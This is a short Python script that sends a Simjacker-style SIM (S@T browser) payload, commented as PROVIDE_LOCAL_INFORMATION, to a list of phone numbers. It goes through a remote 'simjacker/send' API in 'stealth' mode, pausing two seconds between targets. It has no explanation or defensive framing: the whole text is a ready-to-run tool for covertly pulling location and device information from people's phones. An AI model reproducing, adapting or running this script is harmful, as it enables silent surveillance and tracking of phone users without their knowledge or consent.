import requests, time

API_URL = "https://8000-ir356g0rpexbhdtsrpvs1-dfc00ec5.sandbox.novita.ai/simjacker/send"  # Example
API_KEY = "Bearer simjacker_real_api"  # Replace as needed

targets = ["94771234567", "94779874512"]

for n in targets:
    payload = {
        "msisdn": n,
        "payload": "D1D204050C0407520000FF020281830701",  # S@T PROVIDE_LOCAL_INFORMATION
        "mode": "stealth"
    }
    headers = {"Authorization": API_KEY, "Content-Type": "application/json"}
    resp = requests.post(API_URL, json=payload, headers=headers)
    print(f"[{n}] {resp.status_code}: {resp.text}")
    time.sleep(2)